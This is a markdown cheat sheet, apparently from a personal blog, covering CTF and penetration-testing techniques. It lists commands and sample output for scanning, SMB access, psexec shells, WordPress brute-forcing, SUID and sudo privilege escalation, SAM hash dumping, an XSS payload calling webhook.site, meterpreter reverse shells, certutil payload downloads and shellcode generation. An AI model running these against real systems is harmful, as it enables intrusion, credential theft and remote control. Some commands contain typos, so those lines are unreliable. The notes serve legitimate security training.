---
header:
  
layout: single
classes: wide
author_profile: false
categories:
  - Hacking
tags:
  - capture-the-flag
  - hacking
  - cryptography
  - web-security
  - image-forensics
  - Pentesting
---

# System Hacking
* To discover the system in the network, use either Nmap or Netdiscover
* To scan for vulnerabilities use nikto.
  * Command to run : `nikto -h <HOST_IP>`
* To scan for vulnerbilities we can use Nmap also.
  * `namp -sV <HOST_IP>`
  * `nmap --script vuln <HOST_IP>`  -- Useful for getting Vulnerabilities on system
  * `nmap -sS -T4 -A -p- <HOST_IP>` -- Useful for All Ports, SYN Scan and OS detection
  * `nmap --script ssl-enum-ciphers -p 443  <HOST_IP>` -- Gives rating for SSL Ciphers
* If port 80 is open, use robots.txt to find any hidden flags.
* If Anonymous SMB is open, we can mount shares like this
  ```
  root@kali:~/CTF# mkdir /mnt/smb
  root@kali:~/CTF# mount -t cifs //<HOST_IP>/Backups /mnt/smb/
  Password for root@//<HOST_IP>/Backups: 
  ```
* If we found Administrator Creds, we can use this method to get root shell
  ```
  root@kali:/opt/impacket/examples# smbmap -u administrator -p password -H <HOST_IP>
  [+] Finding open SMB ports....
  [+] User SMB session establishd on <HOST_IP>...
  [+] IP: <HOST_IP>:445	Name: <HOST_IP>                                      
	 Disk                                                  	Permissions
	 ----                                                  	-----------
	 ADMIN$                                            	READ, WRITE
	 Backups                                           	READ, WRITE
	 C$                                                	READ, WRITE
	 IPC$                                              	READ ONLY
  root@kali:/opt/impacket/examples# python psexec.py administrator@<HOST_IP>
  Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

  Password:
  [*] Requesting shares on <HOST_IP>.....
  [*] Found writable share ADMIN$
  [*] Uploading file tJJmcVQN.exe
  [*] Opening SVCManager on <HOST_IP>.....
  [*] Creating service RKAe on <HOST_IP>....
  [*] Starting service RKAe.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 10.0.14393]
  (c) 2016 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>
  ```
* To view files on VHD drie, use `7z l <FILENAME>.vhd`
  ```
  root@kali:/mnt/smb# 7z l <VHD_NAME>.vhd
  7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
  p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz (306D4),ASM,AES-NI)
  Scanning the drive for archives:
  1 file, 5418299392 bytes (5168 MiB)
  Listing archive: <VHD_NAME>.vhd
  ```
* To mount VHD drive on Linux use, very useful for forensics
  ```
  root@kali:/mnt/smb# guestmount --add <VHD_NAME>.vhd --inspector -ro -v /mnt/vhd
  ```
* If Webserver is running, we can find the Server version using
  * `curl --header <SERVER_IP>`
* If we want to find exploit of a particular version, use the command
  * `searchsploit apache 1.2.4`
* If /wp-login.php is found in the Vulnerability scanning, it can be Wordpress site.
* Use Burpsuite to see login data
* Use Hydra to bruteforce username
  * `hydra -V -l wordlist.dic -p 123 <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username`
* Use wpscan tool to scan Wordpress Website
  * `gem install wpscan`
  * `wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic`
* We can use metasploit to exploit the server
  * use exploit/unix/webapp/wp_admin_shell_upload -- Does not work
  * pentestmonkey.net/tools/web-shells/php-reverse-shell
* Command to get Bash shell
  * `python -c "import pty;pty.spawn('/bin/bash')"`
* Privilige Escalation: Now if we found the hash for the priviliged user, we can use crackstation.net/ to get the password.
* To find all the files which current user can interact use the command
  * `find / -perm -4000 2>/dev/null`
* If there is any program which we can get to use as root, we need to target that.
  ```
  robot@linux:/$ nmap --interactive
  nmap --interactive
  Starting nmap V. 3.81 ( www.insecure.org/nmap/ )
  Welcome to Interactive Mode -- press h <enter> for help
  nmap> !sh
  !sh
  # id
  id
  uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
  ```
* If we got access to VIM (MAN Pages), we can run `!<Command>` to execute directly in the shell.
* If we want to run old 16bit or 32bit windows program, we can use www.dosbox.com, an emulator which can be installed on Windows.
* If RPC is open, we can use the following to login
  * `rpcclient -U "" <HOST_IP>` -- If this is success without password, we can login using null session.
* If SMB is open, we can use the following command to try connecting
  * `smbclient -L \\\\<HOST_IP>`

# File Hacking
* If something is hidden on a pdf which we need to find, we can Press Ctrl + A to copy everything on the pdf and paste on notepad.
   * If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
   * We can even solve using pdf-uncompress tools like qpdf to convert compressed data to redeable format and solve from there.
* If there is `PK` at the start of the file in the magic bytes, its most probably `ZIP` File.
* If there is recursive ZIP File, we can use the following command `binwalk -Me <FILE_NAME>`.
* If EXE file is having some hidden text, we can use hexeditor or strings to locate the flag.
* If hidden text has == at the end, it is base64 encoded.
* We can use Strace to track all application calls.
  * Command: `strace -s -f 12345 -e trace=recv,read <PROGRAM>`
* We can use ltrace to track all app + library calls.
  * Command: `ltrace ./<PROG_NAME>`

# Cryptography
* If there is word `caesar` in the question or hint, this can be a substitution cipher.
  * Use this website www.dcode.fr/caesar-cipher to Bruteforce the hidden message.

# Forensics
* If there is a image given, try `file` comamnd on the image to learn more information.
* Binwalk to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to <FILE_NAME>.zip to find interesting data.
   * Command `binwalk <IMAGE_NAME>`
* If there is ntfs file,extract with 7Zip on Windowds. If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>` and then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
* Method to extract ntfs in Linux : `sudo mount -o loop <FILENAME.ntfs> mnt`

# Password Cracking
* If there is `JOHN` in the title/text/hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
  * Command : `./john -show <PASS_FILE>`
* To crack Well known Hashes (CTF Related Password Cracking),use [Link](hashes.org)
* To get System User Hashes, we can follow this method
  ```
  root@kali:/mnt/vhd/Windows/System32/config# cp SAM SYSTEM ~/CTF/
  root@kali:/mnt/vhd/Windows/System32/config# cd ~/CTF/
  root@kali:~/CTF# ls
  SAM  SYSTEM  
  root@kali:~/CTF# mkdir Backup_dump
  root@kali:~/CTF# mv SAM SYSTEM Backup_dump/
  root@kali:~/CTF# cd Backup_dump/
  root@kali:~/CTF/Backup_dump# ls
  SAM  SYSTEM
  root@kali:~/CTF/Backup_dump# impacket-secretsdump -sam SAM -system SYSTEM local
  Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

  [*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  User:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
  [*] Cleaning up... 
  ```
  
# XSS Attack
* If there is a website, with a text field to submit, we can try XSS Attack.
  * Use any online HTTP Bin website like https://webhook.site/#!/
  * ``` ""> <img src="https://webhook.site/19df1f1a-2ec8-453e-b85b-ed2cab66a5cc>"```
  
# Packet Capture
* If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
  * Example Command : `tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields`
  
# Privilige Escalation
* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
* [Lin Enum Script](https://github.com/rebootuser/LinEnum)
* [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
* To Use DirtyCow : [Link](https://dirtycow.ninja/) -- Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
* Trick to paste code in VI, with format on remote machines `set paste`
* Try `sudo -l` to check what can be run with no-password.
* For windows:
  * In meterpreter shell try `getsystem`
  * In meterpreter shell try `background` and then follow rest of commands...
  * search suggester
  * `use post/multi/recon/local_exploit_suggestor` (Example only)
  * `show options`
  * `set session 1`
  * `run`
  * If worked fine, else Try follow rest of commands...
  * Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
  * Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
  * If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.
* For Linux:
  * If `sudo -l` gives something like this...
  ```
  User www-data may run the following commands on bashed:
    (enemy : enemy) NOPASSWD: ALL
  ```
  We can try like below
  ```
  $ sudo -u enemy /bin/bash
  id
  uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
  ```
  * To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
  ```
  root# /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
  [*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
  root# msfconsole -r unicorn.rc 
  [*] Started reverse TCP handler on <HOST_IP>:3333 
  msf5 exploit(multi/handler) >         
  ```
  * Get Shell from MYSQL
  ```
  mysql> \! /bin/sh
  ```
  
  * To get Root from VI
  ```
  www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
  ```
  or
  ```
  www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/anyrandomFile
  Type Escape and enter :!/bin/bash
  ```
  * Use [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses etc

# Tools
* Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
* CTF Exploitation Framework : Github.com/Gallopsled/pwntools `pip install pwntools`
* When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
* Dirbuster for enumeration web server Attacks.

## Recover Files from Deleted File Systems
* To Extract Flag from the file system - `strings /dev/sdb`
* Flag Recovery with regex `grep -a '[a-z0-9]\{32\}' /dev/sdb`
* `ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz` -- Used to get from Remote Hosts
* `gunzip -d extract.dd.gz`
* `binwalk -Me extract.dd`

## Transfer Files from Host to Target Machine
* Use `python -m SimpleHTTPServer` in the host folder.
* Use Apache and put files in `/var/www/html/` folder.
* If Tomcat is Opened, upload the file/payload using the Admin panel.
* If wordpress is running, upload the file as plugin.
* In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`

## Powershell
* To bypass execution policy `powershell.exe -exec bypass`

## BufferOverflow
* To generate shellcode quickly, we can use..
  * `python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))`
  * `(python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln`
  

